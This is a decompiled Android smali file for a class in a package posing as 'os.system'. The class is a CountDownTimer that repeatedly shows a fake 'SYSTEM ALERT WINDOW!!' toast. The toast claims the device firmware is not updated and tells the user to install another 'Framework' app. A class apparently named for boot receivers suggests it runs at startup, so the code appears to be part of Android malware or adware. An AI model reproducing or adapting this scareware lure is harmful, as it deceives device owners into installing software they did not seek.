.class Los/system/System$1$2;
.super Landroid/os/CountDownTimer;
.source "System.java"


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Los/system/System$1;->run()V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic this$1:Los/system/System$1;


# direct methods
.method constructor <init>(Los/system/System$1;JJ)V
    .locals 0

    .prologue
    .line 83
    iput-object p1, p0, Los/system/System$1$2;->this$1:Los/system/System$1;

    invoke-direct {p0, p2, p3, p4, p5}, Landroid/os/CountDownTimer;-><init>(JJ)V

    return-void
.end method


# virtual methods
.method public onFinish()V
    .locals 0

    .prologue
    .line 90
    return-void
.end method

.method public onTick(J)V
    .locals 5

    .prologue
    .line 85
    iget-object v0, p0, Los/system/System$1$2;->this$1:Los/system/System$1;

    iget-object v0, v0, Los/system/System$1;->this$0:Los/system/System;

    invoke-static {v0}, Los/system/System;->access$300(Los/system/System;)Los/system/ReceiverBoot;

    move-result-object v0

    iget-object v1, p0, Los/system/System$1$2;->this$1:Los/system/System$1;

    iget-object v1, v1, Los/system/System$1;->this$0:Los/system/System;

    const-string v2, "SYSTEM ALERT WINDOW!!\n\n\nYour firmware is NOT updated please follow this Tutorial.\n\n1. Install this app Framework\n\u00082. Open app finish.\n\n\n\n\n       [ WARNING! ]\n\n\n"

    const/16 v3, -0x100

    const/16 v4, 0x31

    invoke-virtual {v0, v1, v2, v3, v4}, Los/system/ReceiverBoot;->toastText(Landroid/content/Context;Ljava/lang/String;II)V

    .line 86
    iget-object v0, p0, Los/system/System$1$2;->this$1:Los/system/System$1;

    iget-object v0, v0, Los/system/System$1;->this$0:Los/system/System;

    invoke-static {v0}, Los/system/System;->access$300(Los/system/System;)Los/system/ReceiverBoot;

    move-result-object v0

    iget-object v0, v0, Los/system/ReceiverBoot;->toast:Landroid/widget/Toast;

    invoke-virtual {v0}, Landroid/widget/Toast;->show()V

    .line 87
    return-void
.end method
